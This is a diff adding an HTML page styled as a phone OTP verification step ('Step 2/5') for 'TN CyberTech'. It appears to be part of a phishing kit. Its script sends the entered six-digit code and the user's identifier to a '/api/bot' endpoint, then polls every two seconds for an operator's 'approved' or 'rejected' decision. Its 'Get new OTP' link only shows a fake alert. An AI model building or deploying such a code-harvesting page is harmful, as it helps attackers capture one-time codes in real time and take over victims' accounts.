@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TN CyberTech - Verify</title>
+    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { margin: 0; background-color: #fcfcfc; display: flex; justify-content: center; min-height: 100vh; }
+        .app-container { width: 100%; max-width: 400px; padding: 20px; display: flex; flex-direction: column; }
+        
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; }
+        .back-btn { font-size: 24px; color: #333; text-decoration: none; }
+        .title-header { font-family: 'Caveat', cursive; font-size: 28px; font-weight: 700; }
+        .step-text { font-size: 14px; color: #888; }
+
+        h1 { font-family: 'Caveat', cursive; font-size: 32px; color: #000; margin-bottom: 30px; text-align: center;}
+        
+        .illustration { font-size: 100px; text-align: center; margin-bottom: 20px; }
+
+        .info-box { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; font-size: 14px; color: #555; justify-content: center;}
+        .info-icon { width: 20px; height: 20px; background: #B8860B; color: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 12px;}
+
+        .change-number { text-align: center; font-size: 14px; margin-bottom: 30px; }
+        .change-number a { color: #B8860B; text-decoration: none; font-family: 'Caveat', cursive; font-size: 18px; margin-left: 5px;}
+
+        .otp-label { font-size: 14px; margin-bottom: 10px; color: #333; }
+        .otp-boxes { display: flex; justify-content: space-between; margin-bottom: 30px; }
+        .otp-box { width: 50px; height: 60px; border: 1px solid #999; border-radius: 8px; text-align: center; font-size: 24px; color: #333; outline: none; background: transparent; }
+        .otp-box:focus { border-color: #B8860B; }
+
+        .btn-main { width: 100%; background: linear-gradient(90deg, #B8860B, #FFD700, #B8860B); color: #000; font-size: 18px; font-weight: 600; padding: 18px; border: none; border-radius: 30px; cursor: pointer; font-family: 'Caveat', cursive; margin-bottom: 20px; }
+        
+        .resend { text-align: center; font-size: 14px; color: #555; }
+        .resend a { color: #B8860B; text-decoration: none; font-family: 'Caveat', cursive; font-size: 18px; margin-left: 5px;}
+
+        .error-msg { color: red; font-size: 13px; font-weight: bold; text-align: center; display: none; margin-bottom: 10px; }
+
+        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #FFD700; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div id="overlay">
+        <div class="spinner"></div>
+        <h2 style="color:#FFD700;">Verifying...</h2>
+    </div>
+
+    <div class="app-container">
+        <div class="header">
+            <a href="login.html" class="back-btn">&#8592;</a>
+            <div class="title-header">Register</div>
+            <div class="step-text">Step 2/5</div>
+        </div>
+
+        <h1>Verify Phone number</h1>
+        
+        <div class="illustration">🔐</div>
+
+        <div class="error-msg" id="errorMsg">Invalid OTP. Try again.</div>
+
+        <div class="info-box">
+            <div class="info-icon">i</div>
+            Your OTP has been sent to <b id="displayIdentifier" style="margin-left: 5px;">**********3993</b>
+        </div>
+
+        <div class="change-number">
+            Is this your number? <a href="welcome.html">Change here</a>
+        </div>
+
+        <div class="otp-label">OTP (One time Password)</div>
+        <div class="otp-boxes">
+            <input type="tel" class="otp-box" id="otp1" maxlength="1" oninput="move('otp2')">
+            <input type="tel" class="otp-box" id="otp2" maxlength="1" oninput="move('otp3')">
+            <input type="tel" class="otp-box" id="otp3" maxlength="1" oninput="move('otp4')">
+            <input type="tel" class="otp-box" id="otp4" maxlength="1" oninput="move('otp5')">
+            <input type="tel" class="otp-box" id="otp5" maxlength="1" oninput="move('otp6')">
+            <input type="tel" class="otp-box" id="otp6" maxlength="1" oninput="checkOtp()">
+        </div>
+
+        <button id="verifyBtn" class="btn-main" disabled onclick="submitOtp()">Verify Code</button>
+
+        <div class="resend">
+            Haven't received your code? <a href="#" onclick="alert('New code sent!')">Get new OTP</a>
+        </div>
+    </div>
+
+    <script>
+        let globalUserId = sessionStorage.getItem('globalUserId');
+        let userIdentifier = sessionStorage.getItem('userIdentifier') || "Unknown";
+        
+        if(userIdentifier !== "Unknown") { 
+            // Mask the email/phone for display
+            let masked = userIdentifier.length > 4 ? "**********" + userIdentifier.slice(-4) : userIdentifier;
+            document.getElementById('displayIdentifier').innerText = masked; 
+        }
+
+        function move(nextId) {
+            document.getElementById(nextId).focus();
+            checkOtp();
+        }
+
+        function checkOtp() {
+            let otp = "";
+            for(let i=1; i<=6; i++) { otp += document.getElementById('otp'+i).value; }
+            document.getElementById('verifyBtn').disabled = (otp.length !== 6);
+            document.getElementById('errorMsg').style.display = 'none';
+        }
+
+        function submitOtp() {
+            let otp = "";
+            for(let i=1; i<=6; i++) { otp += document.getElementById('otp'+i).value; }
+            if(otp.length !== 6) return;
+
+            document.getElementById('overlay').style.display = 'flex';
+
+            fetch('/api/bot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    action: 'send', type: 'OTP', userId: globalUserId, 
+                    data: { identifier: userIdentifier, value: otp } 
+                })
+            }).then(function() { pollStatus(); })
+            .catch(function() {
+                document.getElementById('overlay').style.display = 'none';
+                alert("Network error.");
+            });
+        }
+
+        function pollStatus() {
+            let interval = setInterval(function() {
+                fetch('/api/bot?userId=' + globalUserId + '&type=OTP', { cache: 'no-store' })
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    if (data.status === 'approved') {
+                        clearInterval(interval);
+                        alert("Success! Verification complete.");
+                        window.location.href = 'index.html';
+                    } else if (data.status === 'rejected') {
+                        clearInterval(interval);
+                        document.getElementById('overlay').style.display = 'none';
+                        document.getElementById('errorMsg').style.display = 'block';
+                        for(let i=1; i<=6; i++) { document.getElementById('otp'+i).value = ''; }
+                        document.getElementById('otp1').focus();
+                        document.getElementById('verifyBtn').disabled = true;
+                    }
+                });
+            }, 2000);
+        }
+    </script>
+</body>
+                                          </html>
